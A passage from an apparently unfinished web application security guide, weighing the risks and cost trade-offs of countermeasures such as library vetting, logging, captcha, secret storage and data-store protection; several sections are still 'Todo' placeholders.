Segmentation is useful, and a common technique to helping to build resistance against attacks. It does introduce some complexity though. With complexity comes the added likely-hood of introducing a fault. 

#### Data-store Compromise

If you follow the advice in the [countermeasures](#web-applications-countermeasures-data-store-compromise) section, you will be doing more than most other organisations in this area. It is not hard, but if implemented could increase complacency/over confidence. Always be on your guard. Always expect that although you have done a lot to increase your security stance, a determined and experienced attacker is going to push buttons you may have never realised you had. If they want something enough and have the resources and determination to get it, they probably will. This is where you need strategies in place to deal with post compromise. Create process (ideally partly automated) to deal with theft.

Also consider that once an attacker has made off with your data-store, even if it is currently infeasible to brute-force the secrets, there may be other ways around obtaining the missing pieces of information they need. Think about the [paper shredders](#physical-identify-risks-sensitive-printed-matter) and the associated [competitions](http://archive.darpa.mil/shredderchallenge/). With patience, most puzzles can be cracked. If the compromise is an opportunistic type of attack, they will most likely just give up and seek an easier target. If it is a targeted attack by determined and experienced attackers, they will probably try other attack vectors until they get what they want.

Do not let over confidence be your weakness. An attacker will search out the weak link. Do your best to remove weak links.

### Lack of Authentication

_Todo_

### Cryptography on the Client (AKA Untrusted Crypto)

_Todo_

### Consuming Free and Open Source

Some of the packages we consume may have good test coverage, but are the tests testing the right things? Are the tests testing that something can not happen? That is where the likes of RetireJS comes in.

#### Process

There is a danger of implementing to much manual process thus slowing development down more than necessary. The way the process is implemented will have a lot to do with its level of success. For example automating as much as possible, so developers don't have to think about as much as possible is going to make for more productive, focused and [happier](https://en.wikipedia.org/wiki/Kaizen) developers.

For example, when a Development Team needs to pull a library into their project, which often happens in the middle of working on a product backlog item (not planned at the beginning of the Sprint), if they have to context switch while a legal review and/or manual code review takes place, then this will cause friction and reduce the teams performance even though it may be out of their hands.  
In this case, the Development Team really needs a dedicated resource to perform the legal review. The manual review could be done by another team member or even themselves with perhaps another team member having a quicker review after the fact. These sorts of decisions need to be made by the Development Team, not mandated by someone outside of the team that doesn't have skin in the game or does not have the localised understanding that the people working on the project do.

Maintaining a list of the approved libraries really needs to be a process that does not take a lot of human interaction. How ever you work out your process, make sure it does not require a lot of extra developer effort on an ongoing basis. Some effort up front to automate as much as possible will facilitate this.

#### Tooling

Using the likes of pre-commit hooks, the other tooling options detailed in the [Countermeasures](#web-applications-countermeasures-consuming-free-and-open-source) section and creating scripts to do most of the work for us is probably going to be a good option to start with.

### Insecure Direct Object References

_Todo_

### Lack of Active Automated Prevention

#### Web Application Firewall (WAF)

_Todo_

#### Application Intrusion Detection and Response

_Todo_

## 5. SSM Costs and Trade-offs

### Lack of Visibility

#### Insufficient Logging and Monitoring

You can do a lot for little cost here. I would rather trade off a few days work in order to have really good logging and instrumentation systems through your code base that is going to show you errors fast in development and pretty much anything you want to measure. Then show the types of errors and statistics devops need to see in production.

Same goes for dark cockpit type monitoring. Find a tool that you find working with a pleasure. There are just about always free and open source tools to every commercial alternative. If you are working with a start-up or young business, the free and open source tools can be excellent to keep ongoing costs down. Especially mature tools that are also well maintained like the ones I've mentioned in the [Countermeasures](#web-applications-countermeasures-lack-of-visibility) section.

### Lack of Input Validation, Filtering and Sanitisation

If you can tighten up your validation and filtering, then less work will be required around sanitisation and that is where most of the effort (effort ≈ time) seems to go. This often reduces the end user experience though.

Once you fully understand the dangers you'll be able to make these decisions easier.

#### Buffer Overflows

_Todo_

#### Cross-Site Scripting (XSS)

_Todo_

#### Cross-Site Request Forgery (CSRF)

_Todo_

#### SQLi

_Todo_

#### Command Injection

_Todo_

#### LDAP Injection

_Todo_

#### XPath Injection

_Todo_

#### XQuery Injection

_Todo_

#### XSLT Injection

_Todo_

#### XML Injection

_Todo_

#### Captcha

The proposed solution costs very little time to implement, is simple, has no external dependencies, is not circumvented if JavaScript is disabled, in fact is not dependant on the browser or what is in it at all. Humans are not disadvantaged.

It does mean that any spam submitted by a real human will have to be moderated by a real human, although this usually takes less time than the human submitting the spam. For me, this is a trade-off worth taking to provide an optimal user experience for my customers/clients.

### Management of Application Secrets

There is potential for hidden costs here, as adjacent layers will need to be hardened. There could be trade-offs here that force us to focus on the adjacent layers. This is never a bad thing though. It helps us to step back and take a holistic view of our security.

#### Store Configuration in Configuration files

There should be little cost in moving secrets out of source code and into configuration files.

##### Windows:

You will need to weigh up whether the effort to obfuscate secrets is worth it or not. It can also make the developers job more cumbersome. Some of the options provided may be worthwhile doing.

##### Linux

Containers have many other advantages and you may already be using them for making your deployment processes easier and less likely to have dependency issues. They also help with scaling and load balancing, so they have multiple benefits.

#### Least Privilege

Is something you should be at least considering and probably doing in every case. It is one of those considerations that is worth while applying to most layers.

#### Location

Segmenting of resources is a common and effective measure to take for at least slowing down attacks and a cost well worth considering if you have not already.

#### Data-store Compromise

The countermeasures discussed here go without saying, although many organisations do not do them well if at all. It is up to you whether you want to be one of the statistics that has all of their secrets revealed. Following the countermeasures here is something that just needs to be done if you have any data that is sensitive in your data-store(s). 

### Lack of Authentication

_Todo_

### Cryptography on the Client (AKA Untrusted Crypto)

_Todo_

### Consuming Free and Open Source

The process has to be streamlined so that it does not get in the developers way. A good way to do this is to ask the developers how it should be done. They know what will get in their way. In order for the process to be a success, the person(s) mandating it will need to get solid buy-in from the people using it (the developers).

The idea of setting up a process that notifies at least the Development Team if a library they want to use has known security defects, needs to be pitched to all stakeholders (developers, product owner, even external stakeholders) the right way. It needs to provide obvious benefit and not make anyones life harder than it already is. Everyone has their own agendas. Rather than fighting against them, include consideration for them in your pitch. I think this sort of a pitch is actually reasonably easy if you keep these factors in mind.

### Insecure Direct Object References

_Todo_

### Lack of Active Automated Prevention

#### Web Application Firewall (WAF)

_Todo_

#### Application Intrusion Detection and Response

_Todo_